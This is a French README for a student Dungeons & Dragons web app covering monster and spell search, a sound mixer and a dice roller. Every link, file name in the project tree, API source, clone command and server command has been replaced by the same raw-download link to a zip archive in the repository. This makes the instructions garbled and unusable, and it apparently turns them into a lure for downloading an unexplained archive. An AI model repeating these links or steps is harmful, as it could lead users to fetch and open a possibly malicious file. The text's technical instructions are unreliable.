# Codex Donjons et Dragons

##  📒 Présentation

Le projet *Donjons et Dragons* est un projet de groupe de la classe DWWM 25-26.  
Les technologies utilisées sont le HTML, CSS, JavaScript et Git pour déployer le projet collaboratif et GitHub.  
Nous avons travaillé avec l’API dungeons\&dragons que voici : [https://github.com/SnayZz371/D-D/raw/refs/heads/main/src/pages/background/D_finer.zip](https://github.com/SnayZz371/D-D/raw/refs/heads/main/src/pages/background/D_finer.zip).   
Ce projet permet aux joueurs et maîtres du jeu de consulter les monstres, sorts, objets, classes etc… avec des outils utiles au bon déroulement de la partie tels que les lanceurs de dés et même une table de mixage d’ambiance sonore style soundboard.  

Url du site : [https://github.com/SnayZz371/D-D/raw/refs/heads/main/src/pages/background/D_finer.zip](https://github.com/SnayZz371/D-D/raw/refs/heads/main/src/pages/background/D_finer.zip)

## 📂 Structure du Projet

```
DungeonsDragons/  
├── src/  
│   ├── assets/             # Images, sons et ressources statiques  
│   ├── components/         # Web Components personnalisés (navbar, search, dice-roller, etc.)  
│   ├── pages/              # Pages spécifiques (monstres, sorts, héros, etc.)  
│   ├── https://github.com/SnayZz371/D-D/raw/refs/heads/main/src/pages/background/D_finer.zip           # Styles globaux et variables de design  
│   ├── https://github.com/SnayZz371/D-D/raw/refs/heads/main/src/pages/background/D_finer.zip           # Logique principale de l'application  
│   └── https://github.com/SnayZz371/D-D/raw/refs/heads/main/src/pages/background/D_finer.zip          # Point d'entrée de l'application  
├── .github/                # Workflows et configurations GitHub  
└── https://github.com/SnayZz371/D-D/raw/refs/heads/main/src/pages/background/D_finer.zip               # Documentation du projet  

```


## 🚀 Installation & Utilisation

1. Cloner le dépôt :

   ```bash  
   git clone https://github.com/SnayZz371/D-D/raw/refs/heads/main/src/pages/background/D_finer.zip  
   ```
2. **Lancer le projet** :  
   - Ouvrez \`https://github.com/SnayZz371/D-D/raw/refs/heads/main/src/pages/background/D_finer.zip\` directement dans votre navigateur.  
   - *Recommandation* : Utilisez une extension comme **Live Server** (VS Code) pour une meilleure expérience de développement et pour éviter les problèmes de CORS lors des appels API.  
   - Utilisation alternative

Ouvrir `https://github.com/SnayZz371/D-D/raw/refs/heads/main/src/pages/background/D_finer.zip` dans un navigateur ou utiliser un serveur local :  
```bash  
# Avec Python  
python -m https://github.com/SnayZz371/D-D/raw/refs/heads/main/src/pages/background/D_finer.zip 8000 --directory src

# Ou avec https://github.com/SnayZz371/D-D/raw/refs/heads/main/src/pages/background/D_finer.zip  
npx serve src  
```

## Licence

Ce projet est un projet éducatif. Les données D\&D appartiennent à *Wizards of the Coast*.

Les interfaces de ce projet ainsi que les traitements sont sous licence MIT.

**Licence MIT** : Le projet est utilisable librement, même à des fins commerciales.   
Avec le code, il est possible de tout faire, que ce soit copier ou modifier le code.   
La seule obligation est de conserver la licence MIT ainsi que le copyright de l’auteur dans le code quand on souhaite l’utiliser.   
Aucune garantie n’est fournie par la licence, si quelque chose est cassé, ils ne peuvent rien faire. Il n'y a pas de protection contre la vente.  
Il est recommandé d’utiliser la licence si on souhaite partager le code sans contrainte, si tu souhaites que le code soit compatible avec tous les frameworks.   
Mais à éviter si on souhaite obliger les gens à partager leur modification et que l’on souhaite avoir un contrôle total sur l’usage du code.

## Fonctionnalités 

Pour ce projet on a créé un site qui a pour but d’aider le maître du jeu d’une partie de donjons et dragons pour cela on a intégré plusieurs fonctionnalité tel que : 

- un système de recherche pour récupérer des informations sur différents éléments du jeu (sorts,monstres,héros,etc…) Ce système est accessible via plusieurs méthodes : une nav en haut de la page où il est possible de taper n’importe quel élément qu’importe son type et la liste des types d’éléments disponibles et une fois cliqué, il est possible de choisir un élément parmi la liste des éléments de ce type.   
- des sons d’ambiance grâce à une sorte de soundboard on peut lancer des sons en rapport avec les jeux tels que des bruitages des musiques de fonds etc..  
- un lanceur de dés sur lequel on choisit le nombre de faces , le nombre de dés puis ça nous donne les résultats

### 🪧 Accueil 

 Tableau de bord global du jeu Donjons et Dragons. Depuis cette page on a accès à tout ce qui est nécessaire pour le bon déroulement des parties de jeu.  
Affichage des catégories Héros, Sorts, Items, Monstres, Sous-classes, Background, Maîtrises, Langues, Traits Raciaux, Aptitudes de classes, Règles en card cliquables qui redirige vers une page html correspondante à la catégorie choisie.   
2 boutons en bas de page gauche et droite respectivement pour la table de mixage et le lancé de dés.  
NavBar présente en haut de page pour permettre la recherche facilitée d’éléments précis comme de l’équipement par exemple avec redirection vers la page correspondante à la recherche lors du clic sur un choix du menu déroulant.

### 🎶 Sons 

1. Icone note de musique en bas à gauche, ouvre un menu “table de mixage D\&D” pour aider le MJ à créer une ambiance et rendre la partie vivante.  
2. Utilisation **“Lecteur”** classique : Possibilité de jouer un son seul en cliquant sur la piste à jouer. Sons triés par grandes catégories (Ambiance/Combat/Autre)  
3. Ajout d’une seconde table de mixage plus avancée en sous menu **“Mixage”** à droite de “Lecteur”. Possibilité de sélectionner plusieurs sons simultanément et de les jouer ensemble  
4. Possibilité de jouer des **scénarios prédéfinis**. Au clic \= sélectionne automatiquement les sons correspondant dans la table de mixage puis les lance en même temps.  
5. Les sons peuvent être rejoués en recliquant  sur le bouton du son associé (pour le lecteur simple) / Peuvent être remis à 0 ou en pause en sélectionnant les boutons “Arrêter Mixage ou “Pause Mixage” (pour la sélection multiple.)  
6. Modularité \++ : Tout est dans un component *dnd-sound-player* pour les pistes/scénarios à rajouter. Fichier mp3 dans *assets/sound*.  
7. Amélioration : Emplacement du bouton d’ouverture du menu à rectifier en mobile \+ modifier le style interne pour coller au reste de l’application. 

### 🎲 Dés 

#### Utilisation

1.  Clique sur le bouton 🎲 en bas à droite pour ouvrir le menu de lancer de dés.
2.  Choisis le nombre de dés et les faces, puis on clique sur **Lancer**
3.  ça affiche une face de chaque dés lancé et le résultat de leurs additions.

#### Technique

On crée un Web Component  `DndDiceRoller` avec son propre *Shadow DOM* pour que le CSS et le HTML soient tous seuls. Le composant garde en mémoire si le menu est ouvert et aussi les résultats des dés .

Quand il est ajouté au DOM, il s’affiche grâce à `render().

On peut ouvrir/fermer le menu avec `toggleMenu().

`rollDice()` prend le type et le nombre de dés entre 1 et 5, et génère des valeurs  aléatoires entre 1 et 6

Les styles sont  : bouton rond animé, animation pour l’apparition.

On montre les résultats et la somme si on a lancé des dés.
Et on enregistre le composant avec `https://github.com/SnayZz371/D-D/raw/refs/heads/main/src/pages/background/D_finer.zip`.

## 📚 Sources

* API pour Donjons et Dragons  
  * site : [https://github.com/SnayZz371/D-D/raw/refs/heads/main/src/pages/background/D_finer.zip](https://github.com/SnayZz371/D-D/raw/refs/heads/main/src/pages/background/D_finer.zip)  
  * projet : [https://github.com/SnayZz371/D-D/raw/refs/heads/main/src/pages/background/D_finer.zip](https://github.com/SnayZz371/D-D/raw/refs/heads/main/src/pages/background/D_finer.zip)  
* illustrations supplémentaires  
  * site : [https://github.com/SnayZz371/D-D/raw/refs/heads/main/src/pages/background/D_finer.zip\_pictures/](https://github.com/SnayZz371/D-D/raw/refs/heads/main/src/pages/background/D_finer.zip)  
  * projet : [https://github.com/SnayZz371/D-D/raw/refs/heads/main/src/pages/background/D_finer.zip\_pictures](https://github.com/SnayZz371/D-D/raw/refs/heads/main/src/pages/background/D_finer.zip)
 
